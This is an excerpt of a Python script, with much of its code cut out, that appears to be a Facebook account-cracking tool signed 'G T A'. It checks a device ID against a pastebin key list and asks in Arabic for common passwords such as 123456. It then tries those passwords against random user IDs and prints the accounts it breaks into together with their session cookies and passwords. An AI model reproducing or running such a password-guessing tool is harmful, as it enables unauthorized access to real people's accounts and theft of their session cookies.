...
def subc():
   ...
   id="|".join(uuid)
   ses=requests.get("https://pastebin.com/WnFPqEPv").text
   if id in ses:
   	pass
   else:
   	print("ﻞﻴﻌﻔﺗ ﺩﻮﻛ "+id)
...
╭╮╮╱▔▔▔▔╲╭╭╮
 ...
 ╭╱╱ ▕╋╋╋╋▏╲╲╮
 ╰╯╯┈╲▂▂╱┈╰╰
_____𓆩☠️G T A ☠️𓆪 _____

\r\033[1;35m===========================
 \r\033[1;33m 𝐴𝐔𝑇𝐻𝑂𝑅 𖠠:  G T A 🫡🔥
\r\033[1;34m  𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊:ᎷᏫᎥᎠ ᎷᏫᎻᎯᎷᎷᎬᎠ
  \r\033[1;34m GITHUB 𖡰:G T A 🔥🔥
...
def random_uid():
	...
	print(f' {H}اختر واحده  من الرموز : 123456,123456789,1234567,12345678 {N}\n')
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[7:22]
				print('\033[1;32m [G T A 😀💚-𝑂𝐾] '+uidx+'-'+uid+'-'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[24:39]
				print('\033[1;31m [G T A 😢💔-𝐂𝐏] '+uidx+'-'+uid+'-'+pasw+'\033[0;97m')
